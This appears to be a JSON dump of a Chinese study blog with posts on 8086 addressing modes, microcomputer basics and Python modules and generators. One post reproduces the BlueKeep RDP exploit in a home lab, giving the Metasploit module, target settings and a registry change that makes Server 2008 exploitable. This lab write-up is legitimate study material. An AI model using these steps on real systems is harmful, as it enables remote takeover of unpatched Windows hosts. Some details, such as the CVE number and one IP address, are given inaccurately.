AX\n\n目的操作数采用直接寻址方式：\n\neg：`DW_WORD,OFFH`       ；将立即数 0FFH 存入 DA_WORD 指向的字节单元\n\neg：`ES:[100H],AX`       ；将 AX 中的内容存入附加段 ES 中偏移 100H 的字单元\n\n###### 寄存器间接寻址：\n\n指指令所需的操作数存放在存储器单元中，其地址偏移量由基址寄存器 BX 、BP 或变址寄存器 SI、DI 给出。BP 默认段 SS；BX，SI，DI 默认段 DS。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190909_112826.jpg)\n\n操作数格式：`[BX|BP|SI|DI]`\n\n目的操作数采用寄存器间接寻址：\n\neg：`MOV [BX],1234H` ；设 BX 的内容为 100H ，将 1234H 存入 DS 段偏移 100H 的字单元\n\neg：`MOV [BP],BL`      ；设 BP 的内容为 100H ，将 BL 存入 SS 段偏移 100H 的字节单元\n\n源操作数采用寄存器间接寻址：\n\neg：`MOV AL,[SI] `      ；设 SI 的内容为 100H ，将 DS 段偏移 100H 的字节单元的内容存入 AL\n\neg：`MOV AX,DS:[BP]` ；设 BP 的内容为 1000H ，将 DS 段偏移 1000H 的字单元的内容存入 AX\n\n注：当存入内容为16位时，存入字单元，8位时存入字节单元。\n\n###### 寄存器相对寻址方式：\n\n指指令所需的操作数存放在存储器单元中，指令中给定的一个基址寄存器或变址寄存器名（BX,BP,SI,DI）和一个8位或16位的相对位移量，两者之和位操作数的地址偏移量。使用 BP ，默认段为 SS ；使用其他寄存器，默认段为 DS。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190909_112837.jpg)\n\n操作数格式：`位移量 [Bx|BP|SI|DI]`\n\neg：`MOV AL,ES:VAR[SI]`  ；设 SI 的内容为 100H ，VAR 所指存储单元的偏移量为200H，\n\n​                                         ；则源操作数偏移量为 300H ,将 ES 段偏移量为 300H 的字节单元内容存入 AL\n\neg：`MOV 10H[BX],1234H`  ；设 BX 的内容为 100H ，则目的操作数偏移量为 110H，\n\n​                                          ；将 1234H存入 DS 段偏移量为 110H 的字单元\n\n###### 基址变址寻址方式：\n\n指指令所需的操作数存放在存储器单元中，指令中给定的一个基址寄存器名 （BX或BP）和一个变址寄存器名 （SI或DI），两者内容之和为操作数的地址偏移量。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190909_112841.jpg)\n\n操作数格式：`[BX|BP+SI|DI`\n\neg：`AX,ES:[BX+SI]`   ；设 BX 的内容为 100H ，SI 的内容为 20H ,则源操作数偏移量为 120H \n\n​                                   ；将 ES 段偏移为 120H 字单元内容存入 AX\n\neg：`[BP+DI],AL`        ；设 BP 的内容为 1000H ，DI 的内容为 50H ，则目的操作数的偏移量为1050H \n\n​                                   ；将 AL 的内容存入 SS 段偏移量为 1050H 的字节单元\n\n###### 相对基址变址寻址方式：\n\n指指令所需的操作数存放在存储器单元中，指令中给定一个基址寄存器名（BX或BP)、一个变址寄存器名（SI或DI）和一个8位或16位的相对地址位移量，三者内容之和为操作数的偏移量。若基址寄存器使用BP ，默认段 SS，基址寄存器使用 BX ，默认段 DS。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190909_112844.jpg)\n\n操作数格式：`位移量[BX|BP+SI|DI]`\n\neg：`MOV AL,[BX+DI-20H]`   ；设 BX 的内容为 100H， DI 的内容为 20H ，则源操作数的偏移量为 100H\n\n​                                            ；将 DS 段偏移量为 100H 的字单元内容存入 AL\n\neg：`MOV [BP+SI+100H],AX`  ；设 BP 的内容为 1000H， DI 的内容为 200H ，则目的操作数的偏移量为 1300H\n\n​\t\t\t\t\t\t\t\t\t\t\t ；将 AX 的内容存入 DS 段偏移量为 1300H 的字单元\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n------\n\n[^]:  注：本篇中所有配图均来自《汇编语言程序设计实用教程》--任向民 ，如有侵权，请联系作者删除！\n\n","tags":["汇编"]},{"title":"微型计算机系统","url":"%2F2019%2F09%2F08%2F%E5%BE%AE%E5%9E%8B%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%2F","content":"\n### 微型计算机系统的基本组成\n\n微型计算机系统由运算器、控制器、存储器、输入设备和输出设备五大部分组成。\n\n运算器是计算机中处理数据的核心部件，主要由执行算术运算和逻辑运算的算术逻辑单元 ALU 、存放操作数和中间结果的寄存器组以及连接各部件的数据通路组成。\n\n控制器是计算机中控制管理的核心部件。\n\n存储器是用来存储数据和程序的部件。\n\n主存储器：\n\n又称内存，用来存放正在运行的程序和数据，可直接与运算器及控制器交换信息。按照存取方式，又分为随机存取存储器 RAM 和只读存储器 ROM 两种。\n\n辅助存储器：\n\n用来存放多种大信息量的程序和数据，可以长期保存。\n\n输入输出设备又称外部设备，是与计算机主机进行信息交换，实现人机交互的硬件环境。\n\n### 微型计算机的系统结构\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190908_210056.jpg)\n\n微处理器 CPU 是由计算机的运算器、控制器以及其相关部件集成的中央处理器。\n\n系统总线是将计算机各部件联系在一起的一组公共信号线。根据总线传送的信号类型，分为数据总线、地址总线和控制总线。\n\n数据总线 DB :\n\n是传输数据和指令代码的信号线，数据总线是双向的，数据可从其他部件传送至 CPU，也可从 CPU 传送到其他部件。\n\n地址总线 AB :\n\n是传送 CPU 所要访问的存储单元或输入输出接口地址的信号线，地址总线是单向的。\n\n控制总线 CB :\n\n是管理总线上活动的信号线，用来实现 CPU 对其他部件的控制、状态等信息的传送以及中断信号的传送。\n\n### 微型计算机的性能指标\n\n##### 字长：\n\n指 CPU 能够同时处理的比特数目。字长约长，计算精度越高，处理能力越强。\n\n##### 主频：\n\nCPU 的时钟频率，是 CPU 内核（整数和浮点数运算器）电路的实际运行频率。主频越高，单位时间内完成的指令数越多。\n\n##### 运算速度：\n\n一般以计算机单位时间内执行的指令条数表示运算速度，单位是 MIPS （每秒百万条指令数）。\n\n##### 内存容量：\n\n指内存储器能够存储信息的总字节数，以 KB、MB、GB 为单位，反映了内存储器存取数据的能力。\n\n##### 存取周期：\n\n指内存进行一次读写访问操作所需的时间。\n\n### 8086微处理器\n\n8086微处理器分为两大功能部件，执行部件 EU 和总线接口部件 BIU。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190908_210127.jpg)\n\n执行部件 EU :\n\n由一个16位的 ALU ，8个16位的通用寄存器，一个16位的状态标志寄存器，一个数据暂存寄存器和执行部件的控制电路组成。\n\n总线部件 BIU :\n\n由4个16位的段地址寄存器（代码段寄存器 CS、数据段寄存器 DS、堆栈段寄存器 SS和附加段寄存器 ES），一个16位指令寄存器 IP ,一个6字节指令队列缓冲器，20位地址加法器和总线控制电路组成。\n\n### 8086的寄存器：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/IMG_20190908_210137.jpg)\n\n通用寄存器：\n\n通用寄存器可分为数据寄存器和地址指针寄存器。\n\n数据寄存器：\n\n一般用来存放16位数据，主要用来保存操作数或运算结果等信息。\n\n包括4个16位的寄存器 AX(累加器)、BX(基址寄存器)、CX(计数寄存器)、DX(数据寄存器)。其中每一个又可以根据需要将高8位和低8位分出独立的两个8位寄存器来使用，即 AH、BH、CH、DH、AL、BL、CL、DL。\n\n地址指针寄存器：\n\n主要用于存放某个存储单元地址的偏移，或某组存储单元开始地址的偏移，作为存储器指针使用。地址指针寄存器不能分解为8位寄存器使用。\n\n包括指针寄存器 SP(堆栈指针)、 BP(基址指针)和变址寄存器 SI(源变址寄存器)、DI(目的变址寄存器)。\n\n指针寄存器：\n\n指令指针寄存器 IP 用于存放 EU 要执行的下一条指令的偏移地址，用以控制程序中指令的执行顺序，实现对代码段指令的跟踪。\n\n标志寄存器：\n\n8086 CPU 中有一个16位的标志寄存器，共9个标志，用于反映处理器的状态和运算结果的某些特征，其中6个用着状态标志，主要受加减运算和逻辑运算结果的影响，3个用作控制标志，不受运算结果的影响。\n\n状态标志有以下几种：\n\n| 状态标志        | 说明                                                         |\n| --------------- | ------------------------------------------------------------ |\n| 进位标志 CF     | 产生进位或错误时 CF=1，否则为0。                             |\n| 奇偶标志 PF     | 操作结果低8位中1的个数位偶数时 PF=1，否则为0。               |\n| 辅助进位标志 AF | 在进行算术运算时，如低字节中低4位产生进位或错位是 AF=1，否则为0。 |\n| 零标志位 ZF     | 当操作结果为0时,，ZF=1，否则为0。                            |\n| 符号标志 SF     | 操作结果看作有符号数时，结果为负，SF=1，否则为0。            |\n| 溢出标志 OF     | 当运算结果超出补码表示数的范围时，即溢出，此时OF=1，否则为0。 |\n\n控制标志有以下几种：\n\n| 控制标志        | 说明                                                         |\n| --------------- | ------------------------------------------------------------ |\n| 单步标志 TF     | 当 TF=1 时，CPU在执行完一条指令后产生单步中断，然后由单步中断服务程序把 TF 置0。 |\n| 中断允许标志 IF | 允许 CPU 响应可屏蔽外中断请求，当 IF=0 时，禁止 CPU 响应可屏蔽外中断。 |\n| 方向标志 DF     | 用于串操作指令，当 DF=0 时，串操作的地址指针自动递增，当 DF=1 时，自动递减。 |\n\n段寄存器：\n\n8086CPU 共有4个16位的段寄存器，4个段寄存器的功能如下：\n\n代码段寄存器 CS：用来存放当前代码段（将被执行的程序）的首地址的高16位，首地址的低4位为0。\n\n数据段寄存器 DS：用来存放当前数据段（将被执行程序所用的操作数）的首地址的高16位，首地址的低4位为0。\n\n附加段寄存器 ES：用来存放当前附加段（将被执行程序所用的操作数）的首地址的高16位，首地址的低4位为0。\n\n堆栈段寄存器 SS：用来存放当前堆栈段（将被执行程序所用的堆栈）的首地址的高16位，首地址的低4位为0。\n\n###  8086存储器组织\n\n存储器结构：\n\n8086微处理器有20根地址线，可寻址 1MB 的存储空间，其物理地址范围为 00000H--FFFFFH。在组成与 8086CPU 连接的存储器时，1MB 的空间被分为两个 512KB 的存储体，低位存储体（偶地址存储体）和高地址存储题（奇地址存储体）。\n\n存储器以字节为单位进行线性组织，两个相邻的字节被称为一个‘字’，存放数据以‘高高低低’为原则。假设 20000H 的字节存储单元中的内容为 34H ,20001H 的字节存储单元中的内容为 12H ,则地址为 20000H 的字节单元内容为 34H ,地址为20000H 的字单元内容为 1234H。\n\n逻辑地址和物理地址：\n\n逻辑地址：\n\n各逻辑段的起始地址必须是能被16整除的地址，即逻辑段的起始地址的低4位二进制数必须是0，一个段的起始地址的高16位被称作该段的地址。CPU 对存储单元内的数据进行处理时，使用的是逻辑地址来指定存储器，逻辑地址由段地址和偏移地址两部分组成。\n\n格式： `段地址：偏移地址`\n\n物理地址：\n\n物理地址就是存储单元的实际地址，在 CPU 通过总线对存储器进行操作时，需利用物理地址来查找所需要访问的存储单元。\n\n逻辑地址与物理地址的关系如下：\n\n物理地址 = 段地址 * 10H + 偏移地址\n\n\n\n\n\n\n\n\n\n---\n\n\n\n[^]:  注：本篇中所有配图均来自《汇编语言程序设计实用教程》--任向民 ，如有侵权，请联系作者删除！\n\n","tags":["汇编"]},{"title":"cve-2019-07-08复现","url":"%2F2019%2F09%2F07%2Fcve-2019-07-08%E5%A4%8D%E7%8E%B0%2F","content":"\n回学校一周了，博客一直没时间更新，今天朋友圈被CVE-2019-07-08的 exp 炸了，也尝试着复现一下。\n\n目前的exp只针对 win7 x64 以及 win server 2008 ，且2008需要修改注册表。\n\n以下是复现过程。\n\n攻击机：kali 192.168.31.137\n\n靶机：\n\nwin7 企业版 192.168.31.128 vmware\n\nserver 2008 192.168.31.132 vmware\n\nwin7 x64的复现过程：\n\n选择攻击模块`use exploit/windows/cve_2019_0708_bluekeep_rce `\n\n查看设置信息 `info`\n\n![1](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/PJL%7B%7DN0%40JDTO_BFCBG3MY9Y.png)\n\ntargets：攻击目标类型\n\n1.物理卷\n\n2.vritualbox 虚拟机\n\n3.vmware 虚拟机\n\n4.hyper -v 虚拟机\n\n设置靶机ip `set RHOSTS 192.168.31.128`\n\n设置靶机类型 `set target 3`\n\n建立连接后使用 python 弹回交互式 shell。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/QQ%E5%9B%BE%E7%89%8720190907145.png)\n\n2008 server的复现过程：\n\n需要先修改注册表，不然就会直接打蓝屏。\n\nwin+r 输入 regedit\n\n将注册表`[HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Terminal Server\\WinStations\\rdp-tcp\\fDisableCam]`值修改为0\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/QQ%E5%9B%BE%E7%89%8720190907172731.png)\n\n设置靶机ip `set RHOSTS 192.168.31.128`\n\n设置靶机类型 `set target 3`\n\n建立连接后使用 python 弹回交互式 shell。\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/QQ%E5%9B%BE%E7%89%8720190907171454.png)\n\n注：设置攻击类型时必须匹配靶机类型，不然就直接打蓝屏。\n\n错误示范一下：\n\n把`set target `  设置为 1，效果如下：\n\n![](https://hades-1300189337.cos.ap-chengdu.myqcloud.com/blog%E5%9B%BE%E7%89%87/1/QQ%E5%9B%BE%E7%89%8720190907173901.png)\n\n\n\n---\n\n\n\n[^]:  注：复现过程只是个人学习，不可用于非法用途！\n\n参考链接：https://qiita.com/shimizukawasaki/items/024b296a4c9ae7c33961\n\n","tags":["漏洞"]},{"title":"python模块","url":"%2F2019%2F08%2F27%2Fpython%E6%A8%A1%E5%9D%971%2F","content":"\n### Time模块\n\n```python\nimport time #调用time模块\n\n1.time.time()  #返回当前时间戳  从1970年1月1日开始\n2.time.perf_counter()#返回系统运行时间\n3.time.process_time()#返回进程运行时间\n4.time.localtime()#返回当前电脑时间\n5.time.gmtiime()#返回utc结构化时间\n6.time.strftime('%Y--%m--%d %H--%M--%S',time.localtime())#返回字符串格式时间\n7.time.strptime('2019--06--11 08--30--46','%Y--%m--%d %H--%M--%S')\nprint(a)  #time.struct_time(tm_year=2019, tm_mon=6, tm_mday=11, tm_hour=8, tm_min=30, tm_sec=46, tm_wday=1, tm_yday=162, tm_isdst=-1)  返回一个结构化时间可分别引用\nprint(a.tm_year)  #2019\nprint(a.tm_wday)  #1\n8.time.ctime(1)  #传递参数从1970年1月1日开始计时  #Thu Jan  1 08:00:01 1970\n9.time.mktime()  #mktime(...)   mktime(tuple) -> floating point number\n```\n\n### Datatime模块\n\n```python\nimport datetime\n\nprint(datetime.datetime.now())  2019-06-11 13:30:10.367575 #返回电脑当前时间\n```\n\n### Ramdom模块\n\n```python\nimport random\n\n1.random.random() #随机生成一个0-1之间的浮点数\nprint(random.random())    #0.8325469381335062\nprint(random.random())    #0.24143660720088223\nprint(random.random())    #0.19366939568288866\nprint(random.random())    #0.16182727045935497\n2.random.randint(1,8)  #随机生成一个1~8之间的数（包括8）  \n3.random.choic('hello')  #随机生成一个参数内字符\nprint(random.choice('hello'))   #l\nprint(random.choice(['123',4,[1,2]]))  #[1, 2]\n4.random.sample(['123',4,[1,2]],2)  #随机生成2个参数内字符\nprint(random.sample(['123',4,[1,2]],2))  #['123', [1, 2]]\n5.random.randrange(1,3) #不包括3\n```\n\nrandom模块生成随机验证码\n\n```python\ndef c_void():  #生成5位随机验证码\nviod=''\n     for i in range(5):\n       add=random.choice([random.randrange(10),chr(random.randint(65,90))])\n         viod += str(add)\n     print(viod)\nc_viod()   #1MGC1\n```\n\n### Sys模块 \n\n1.sys.argv()  #传入参数  可以与python解释器交互\n\n```python\ndef down():\n     pass\nif sys.argv[1]=='post':\n     print(\"down\")\nelif sys.argv[2]=='path':\n     print('up')\n```\n\n2.sys.exit(0)  #退出  0正常\n\n3.sys.path  #查找模块路径\n\n```python\nprint(sys.path)\n#['E:\\\\full-stack\\\\week1\\\\day5', 'E:\\\\full-stack', 'D:\\\\python3.7\\\\python37.zip', 'D:\\\\python3.7\\\\DLLs', 'D:\\\\python3.7\\\\lib', 'D:\\\\python3.7', 'D:\\\\python3.7\\\\lib\\\\site-packages', 'c:\\\\users\\\\王123\\\\turtle-0.0.2\\\\turtle-0.0.2', 'E:\\\\pycharm\\\\PyCharm 2018.2.1\\\\helpers\\\\pycharm_matplotlib_backend']\n```\n\n4.sys.platform  ##输出操纵系统类型\n\n```python\nprint(sys.platform)\n#win32\n```\n\n### Hashlib 加密模块\n\n```python\na=hashlib.md5()\na.update('abc'.encode('utf-8'))   #md5加密\nprint(a.hexdigest())  #输出密文900150983cd24fb0d6963f7d28e17f72\na.update('chen'.encode('utf-8')) #在‘abc’的基础上加上‘chen’加密\nprint(a.hexdigest()) #f5a939b1e52c4deb9e3d028d7ed7cb9e\nb=hashlib.md5()\nb.update('abcchen'.encode('utf-8')) #f5a939b1e52c4deb9e3d028d7ed7cb9e\nprint(b.hexdigest())\n```\n\n### Os模块\n\n```python\nos.getcwd()  \n#获取当前工作目录，即当前python脚本工作的目录路径   \n#E:\\full-stack\\week1\\day5\nos.chdir(''dirname)   \n#改变当前脚本工作目录；相当于shell下cd\nos.curdir()  #返回当前目录: ('.')\nos.pardir()   #获取当前目录的父目录字符串名：('..')\nos.makedirs('dirname1/dirname2')    #可生成多层递归目录\nos.removedirs('dirname1')    \n#若目录为空，则删除，并递归到上一级目录，如若也为空，则删除，依此类推\nos.mkdir('dirname')    #生成单级目录；相当于shell中mkdir dirname\nos.rmdir('dirname')    #删除单级空目录，若目录不为空则无法删除，报错；相当于shell中rmdir dirname\nos.listdir('dirname')    \n#列出指定目录下的所有文件和子目录，包括隐藏文件，并以列表方式打印\nos.remove()  #删除一个文件\nos.rename(\"oldname\",\"newname\")  #重命名文件/目录\nos.stat('path/filename')  #获取文件/目录信息\n\nprint(os.stat(r\"E:/full-stack/week1/day5\"))   #os.stat_result(st_mode=16895, st_ino=5348024557502549, st_dev=2429873425, st_nlink=1, st_uid=0, st_gid=0, st_size=4096, st_atime=1560688434, st_mtime=1560688434, st_ctime=1560002672)\n\nos.sep    \n#输出操作系统特定的路径分隔符，win下为\"\\\\\",Linux下为\"/\"\nos.linesep    \n#输出当前平台使用的行终止符，win下为\"\\t\\n\",Linux下为\"\\n\"\nos.pathsep    #输出用于分割文件路径的字符串\nos.name    \n#输出字符串指示当前使用平台。win->'nt'; Linux->'posix'\nos.system(\"bash command\")  \n#运行shell命令，直接显示\nos.environ  \n#获取系统环境变量\nos.path.abspath(path)  \n#返回path规范化的绝对路径\nos.path.split(path)  \n#将path分割成目录和文件名二元组返回\nos.path.dirname(path)  \n#返回path的目录。其实就是os.path.split(path)的第一个元素\nos.path.basename(path)  \n#返回path最后的文件名。如何path以／或\\结尾，那么就会返回空值。即os.path.split(path)的第二个元素\n\nprint(os.path.abspath('E:/full-stack/week1/day5'))\n#E:\\full-stack\\week1\\day5\nprint(os.path.dirname('E:/full-stack/week1/day5'))\n#E:/full-stack/week1\nprint(os.path.basename('E:/full-stack/week1/day5'))\n#day5\n\nos.path.exists(path)  \n#如果path存在，返回True；如果path不存在，返回False\n# os.path.isabs(path)  如果path是绝对路径，返回True\n# os.path.isfile(path)  如果path是一个存在的文件，返回True。否则返回False\n# os.path.isdir(path)  如果path是一个存在的目录，则返回True。否则返回False\n# os.path.join(path1[, path2[, ...]])  将多个路径组合后返回，第一个绝对路径之前的参数将被忽略\n# os.path.getatime(path)  返回path所指向的文件或者目录的最后存取时间\n# os.path.getmtime(path)  返回path所指向的文件或者目录的最后修改时间\n```\n\n### \tLogging 日志模块\n\nlogging.debug('debug message')\n\nlogging.info('info message')\n\nlogging.warning('hello everone')\n\nlogging.error('error message')\n\nlogging.critical('critical message')\n\n默认输出级别为warning   C>E>W>I>D\n\n```python\n#WARNING:root:hello everone \n#ERROR:root:error message\n#CRITICAL:root:critical message\n```\n\n自定义日志存储\n\n```python\nlogging.basicConfig(level=logging.DEBUG,   #调整输入的级别  \nformat='%(asctime)s %(filename)s[line:%(lineno)d] %(levelname)s %(message)s',  #定义输出的格式\ndatefmt='%a, %d %b %Y %H:%M:%S',  \nfilename='test.log',  #定义输入日志的文件\nfilemode='a') \n#Thu, 13 Jun 2019 21:24:52 loggingģ��.py[line:17] DEBUG debug message\nlogging.debug('debug message5')\nlogging.info('info message2')\nlogging.warning('warning message12')\nlogging.error('error message8')\nlogging.critical('critical message')\n```\n\n创建对象调用日志，输入到文件和屏幕\n\n```python\nlogger = logging.getLogger()\nlogger.setLevel(logging.DEBUG)  #定义日志输出级别\n# 创建一个handler，用于写入日志文件\nfh = logging.FileHandler('test.log')\n# 再创建一个handler，用于输出到控制台\nch = logging.StreamHandler()\nformatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')\nfh.setFormatter(formatter)\nch.setFormatter(formatter)\nlogger.addHandler(fh) #logger对象可以添加多个fh和ch对象\nlogger.addHandler(ch)\nlogger.debug('logger debug message')\nlogger.info('logger info message')\nlogger.warning('logger warning message')\nlogger.error('logger error message')\nlogger.critical('logger critical message')\n```\n\n### Re——正则\n\n正则是对字符串进行处理的，引入正则的目的是为了进行模糊匹配。\n\n##### 正则的元字符 \n\n. 通配符  不能代指\\n 只能代指一个字符\n\n^ 尖角符 只在开始匹配\n\n$ 只在结尾匹配\n\n##### 重复匹配\n\n\\* [0,+00)        + [1,+00)        ? [0,1]           {}  可定义匹配次数\n\n结论 * = {0,+00}         + = {1,+00}             ? ={0,1}\n\n##### 特殊字符\n\n[] 字符集   取消元字符的特殊功能 (\\  ^  -)例外\n\n[ ^ ]  取反\n\n\\\n\n\\# 1.反斜杠后面跟元字符去除其特殊功能\n\n\\# 2.反斜杠后面跟普通字符实现特殊功能\n\n\\# \\d 匹配任何十进制数 相当于类[0-9]\n\n\\# \\D 匹配任何非数字字符 \\[^0-9]\n\n\\# \\s 匹配任何空白字符 相当于类[\\t \\n \\r \\f  \\v]\n\n\\# \\S 匹配任何空白字符 相当于类\\[^\\t \\n \\r \\f  \\v]\n\n\\# \\w 匹配任何字符数字字符 相当于类[1-9a-zA-Z]\n\n\\# \\W 匹配任何非字符数字字符 相当于类\\[^1-9a-zA-Z]\n\n\\# \\b 匹配一个特殊字符边界  也就是指单词和特殊字符的位置\n\n()   分组\n\n##### 使用举例\n\n```python\na=re.findall('w..l','hello world')  \nprint(a)\nb=re.findall('w..l','hello w\\nld')\nprint(b)\n#['worl']\n#[]\n\na=re.findall('^h...o','hello world hoxlo')\nprint(a)   \nb=re.findall('^h...o','hlllll hello')\nprint(b）\n#['hello']\n#[]\n\na=re.findall('a..x$','asdsafasalex')   \n#  $只在结尾匹配\nprint(a)\nb=re.findall('a..x$','asdsafasalexx')   \n#  $只在结尾匹配\nprint(b)\n#['alex']\n#[]\n\na=re.findall('ab*','asfasdabbbabs')\n#a后面可有0-无穷个b\nprint(a)\n# + [1,+00)\na=re.findall('a+b','asfasdabbbabs')\n#b前面可有1-无穷个a\nprint(a)\n#? [0,1]\na=re.findall('a?b','asfasdabbbabs') \n#0到1个a 后面有一个b\nprint(a)\n# {}  可定义匹配次数\na=re.findall('a{1,3}b','asfasdaaaaaabbbabs')\n#1—3个a后面一个b\nprint(a)\n#['a', 'a', 'abbb', 'ab']\n#['ab', 'ab']\n#['ab', 'b', 'b', 'ab']\n#['aaab', 'ab']\n\na=re.findall('a[a-z]x','adxabxaex')  \n#输出a（a-z中任意一个）x\nb=re.findall('a[w,,]x','adxa*xa,x')  \n#输出a（w或,）x\nprint(a,'\\n',b)\na=re.findall('[1-9，a-z，A-Z]','adxabxaex456as4f65as489aw4d6') \n#输出1-9的数字，a-z的字母,A-Z的字母\nprint(a)\n#['adx', 'abx', 'aex']\n#['a,x']\n#['a', 'd', 'x', 'a', 'b', 'x', 'a', 'e', 'x', '4', '5', '6', 'a', 's', '4', 'f', '6', '5', 'a', 's', '4', '8', '9', 'a', 'w', '4', 'd', '6']\n\na=re.findall('[^4,5]','466865416132132')   \n#[ ^ ]  取反 除去4，5的其他数字\nprint(a)\n#['6', '6', '8', '6', '1', '6', '1', '3', '2', '1', '3', '2']\n\nprint(re.findall(r'i\\b','hello,i am a list')) \n#i后有空格特殊字符 输出‘i’\na=re.search('sb','asfasbffsdsb') #.group()  \n#匹配出满足条件的第一个结果\nprint(re.search('sb','asfasbffsdsb'))\nprint(a.group())\na=re.search('a\\+','a+hi').group() \n#+号元字符失去作用，表示普通字符\nprint(a)\n#['i']\n#<re.Match object; span=(4, 6), match='sb'>\n#sb\n#a+\n\nprint(re.search('(as)+','dsasdasfgdgdasas').group())\n#as  as整体作为一个组去匹配\n\nprint(re.search('(as)|3','3as3').group())\n#3   |或的意思，as整体作为一个被非掉\n\na=re.search('(?P<id>\\d{3})/(?P<name>\\w{3})','weeew34ttt123/000')  \n      #\\d 表示匹配3个数字  \\w 表示匹配3个数字字符\n\n\nprint(a.group())\nprint(a.group('id'))\nprint(a.group('name'))\n#123/000\n#123\n#000\n```\n\n##### 正则表达式的使用\n\n```python\n正则表达式的方法：\n1.re.findall()  #所有结果都返回一个列表\n2.re.search() #返回一个对象（object）,对象可以调用group方法\n3.match()   \n#只在字符串开始匹配，也指返回一个对象 可调用group方法\n4.re.split()\n'ads'.split('s')\na=re.split('[k,s]','asjksdasfa')  \n#先分k  [asj,sdasfa] 再分s [a,j,'',da,fa]\nprint(a)\n5.re.sub()\n#替换\na=re.sub('a..x','s..b','gsdfasgsalexagdafas')\nprint(a)  #gsdfasgss..bagdafas\nre.findall('\\.com','asdas.comsda')\nobj=re.compile('\\.com')  #将规则编译成对象\n```\n\n","tags":["python"]},{"title":"python迭代器、生成器、装饰器","url":"%2F2019%2F08%2F27%2Fpython%E8%BF%AD%E4%BB%A3%E5%99%A8%E3%80%81%E7%94%9F%E6%88%90%E5%99%A8%E3%80%81%E8%A3%85%E9%A5%B0%E5%99%A8%2F","content":"\n### 1.生成器的两种定义方式\n\n```python\n1.  (x*2 for x in range(10))\n\n2.def foo():\n    yield 1\nc=foo()       \n```\n\n#### 列表生成器  \n\n```python\na=[x for x in range(10)]   \nprint(a)   #[1,2,3,4,5,6,7,8,9]\n\ndef f(n):\n   return n**3\ns=[f(c) for c in range(3)]\nprint(s) #[0,1,8]\n```\n\n#### 生成器\n\n```python\ndef foo():\n    print('ok1')\n    yield 1  #yield 关键字\n    print('0k2')\n    yield 2\nc=foo()  \n#一个生成器类型地址<generator object foo at 0x0000029A42661570>\n\ndef foo():\n    print('ok1')\n    yield 1  #yield 关键字\n    print('0k2')\n    yield 2\n#c=foo()  \n#一个生成器类型地址<generator object foo at 0x0000029A42661570>\n#不加c=foo()时  \n#foo()相当于一个函数  yiled相当于return\n```\n\n### 2.生成器的两种方法：\n\n#### next调用\n\n```python\ndef foo():\n    print('ok1')\n    yield 1  #yield 关键字\n    print('0k2')\n    yield 2\nc=foo()  \n#一个生成器类型地址<generator object foo at 0x0000029A42661570>\na=next(c)  \nb=next(c)  # ok1 ok2 1 2\n\n注：def foo():\n    print('ok1')\n    yield 1  #执行到该步return \n    print('0k2')\n    yield 2\na=next(foo())  \nb=next(foo())  \nprint(a,b)  # ok1 ok2 1 2\n```\n\n#### send调用\n\n```python\ndef foo():\n    print('ok1')\n    a=yield 1   ①\n    print(a)\n    print('0k2')\n    b=yield 2\n    print(b)\n    c=yield 3\n    print(c)\nc=foo()\nc.send(None) #相当于next(b) 执行到yield 1\nc.send('abc')  # 给a赋值 ‘abc’ 执行到yield 2\nc.send('cba')  # 给b赋值 ‘cba’ 执行到yield 3\n```\n\n注：生成器在定义时值的数量是固定的，调用超出会StopIteration\n\n#### yield 实现伪并发\n\n```python\nimport time\ndef cons(name):\n    print(\"%s准备吃包子了\" % name)\n    while True:\n        baozi = yield\n        print(\"包子%d来了  %s开始吃包子了\" % (baozi,name))\ndef do(name):\n    print(\"准备做包子了\")\n    a=cons('a')  #调用con()使得a为生成器\n    b=cons('b')  #调用con()使得b为生成器\n    a.__next__()  #初次使用生成器 为send赋值做准备\n    b.__next__()\n    print('开始做包子了')\n    for i in range (1,5):\n        time.sleep(2)\n        print('做了2个包子')\n        a.send(i)  #赋值i给包子\n        b.send(i)\ndo('chen')\n```\n\n### 3.可迭代类型  iterable\n\n3.可迭代类型  iterable\n\n- 列表  list \n- 元组  tuple\n- 集合 set\n- 字典 dict\n\n```python\na=[1,2,3]\nb=(1,2,3)\nc={1,2,3}\nd={'name':''}\nprint(type(a))   #<class 'list'>\nprint(type(b))   #<class 'tuple'>\nprint(type(c))   #<class 'set'>\nprint(type(d))   #<class 'dict'>  \n```\n\n### 4.迭代器  iterator  ——遵循迭代器协议 \n\n（1.）next方法\n\n（2.）iter()方法\n\n```python\na=[1,2,3]\nb=(1,2,3)\nc={1,2,3}\nd={'name':''}  \nprint(iter(a))   #<list_iterator object at 0x0000014B220BDCC0>\nprint(iter(b))   #<tuple_iterator object at 0x0000014B220BDCC0>\nprint(iter(c))   #<set_iterator object at 0x0000014B22070DC8>\nprint(iter(d))   #<dict_keyiterator object at 0x0000014B21DDA548>\n```\n\n#### 4.for循环作用\n\n```python\nfor i in iterable\n   print i\n#1.使用iter方法装换成迭代器\n#2.调用next方法输出\n#3.检查容错  StopIteration\n```\n\n### 5.python装饰器\n\n装饰器的实现条件：\n\n1.函数的定义域\n\n2.高阶函数的使用\n\n#### 闭包：\n\n```python\ndef outer():\n    x = 10\n    def inner():  #inner 是内部函数\n        print(x)   #x是inner函数外的变量\n    return inner   #inner就是一个闭包\nouter()()  